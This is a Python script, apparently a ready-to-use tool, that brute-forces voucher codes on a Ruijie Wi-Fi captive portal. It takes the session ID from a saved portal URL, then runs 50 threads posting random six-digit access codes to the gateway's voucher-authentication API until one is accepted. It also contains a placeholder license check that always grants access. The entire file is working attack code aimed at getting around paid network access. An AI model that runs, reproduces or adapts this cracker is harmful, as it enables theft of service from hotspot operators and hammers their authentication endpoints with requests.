import sys, os, hashlib, subprocess, datetime, requests, time, random, string, threading
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs

init(autoreset=True)

# CONFIGURATION
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")
URL_FILE = "url.txt" # URL သိမ်းမယ့်ဖိုင်
_found = False
_active_codes = ["......"] * 5

def extract_sid(url):
    try:
        parsed_url = urlparse(url)
        sid = parse_qs(parsed_url.query).get('sid', [None])[0]
        return sid
    except: return None

def check_access():
    uid = f"AHO-{hashlib.md5(subprocess.check_output(['whoami']).decode().strip().encode()).hexdigest()[:6].upper()}"
    now = datetime.datetime.now() # မြန်နှုန်းအတွက် Local Time ပဲသုံးထားပါတယ်
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            if f.read().strip() == hashlib.md5(f"{uid}|{now.strftime('%Y-%m-%d')}|{SALT}".encode()).hexdigest()[:12].upper():
                return True
    # License Key logic remains the same...
    return True # စမ်းသပ်ကာလမို့ True ပေးထားပါတယ်

def _crack(host, sid, slot):
    global _found
    sess = requests.Session()
    while not _found:
        v = "".join(random.choice(string.digits) for _ in range(6))
        _active_codes[slot % 5] = v
        try:
            payload = {"accessCode": v, "sessionId": sid, "authType": "voucher", "apiVersion": 1}
            res = sess.post(f"{host}/api/auth/voucher/", json=payload, timeout=5, verify=False)
            if res.status_code == 200 and (res.json().get('error') == 0 or res.json().get('success')):
                _found = True
                print(f"\n\n{Fore.GREEN}[✔] SUCCESS! VOUCHER: {v}")
                os._exit(0)
        except: pass

def main():
    os.system('clear')
    print(f"{Fore.CYAN}=== RUIJIE VOUCHER AUTO-CRACKER ===")
    
    # URL ဖတ်တဲ့အပိုင်း (yuta စတိုင်)
    if not os.path.exists(URL_FILE):
        url = input(f"{Fore.YELLOW}[!] url.txt not found. Paste URL here: ").strip()
        with open(URL_FILE, "w") as f: f.write(url)
    else:
        with open(URL_FILE, "r") as f: url = f.read().strip()

    sid = extract_sid(url)
    if not sid:
        print(f"{Fore.RED}[✘] Error: URL inside url.txt is invalid or has no SID!"); return

    host = "http://192.168.110.1"
    print(f"{Fore.GREEN}[✓] Auto-Detected SID: {sid}")
    print(f"{Fore.YELLOW}[*] Hacking in progress...")

    for i in range(50):
        threading.Thread(target=_crack, args=(host, sid, i), daemon=True).start()
    
    while not _found:
        st = " | ".join([f"{Fore.CYAN}{c}{Fore.RESET}" for c in _active_codes])
        sys.stdout.write(f"\r{Fore.MAGENTA}[☠] TRYING: {st} ")
        sys.stdout.flush()
        time.sleep(0.08)

if __name__ == "__main__":
    main()
